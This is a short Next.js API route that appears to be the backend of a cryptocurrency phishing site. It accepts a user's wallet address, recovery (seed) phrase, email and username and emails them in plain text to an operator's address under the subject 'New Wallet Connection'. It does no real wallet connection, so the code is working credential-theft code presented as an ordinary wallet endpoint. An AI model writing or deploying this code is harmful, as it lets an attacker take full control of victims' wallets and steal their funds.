import nodemailer from "nodemailer";
import { NextRequest } from "next/server";

export async function POST(req: NextRequest) {
  const { wallet, phrase, email, username } = await req.json();

  const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: Number(process.env.SMTP_PORT ?? 587),
    secure: process.env.SMTP_SECURE === "true",
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });

  await transporter.sendMail({
    from: process.env.SMTP_FROM ?? process.env.SMTP_USER,
    to: process.env.SMTP_TO,
    subject: "New Wallet Connection",
    text: `Username: ${username}\nEmail: ${email}\nWallet: ${wallet}\nPhrase: ${phrase}`,
  });

  return Response.json({ ok: true });
}
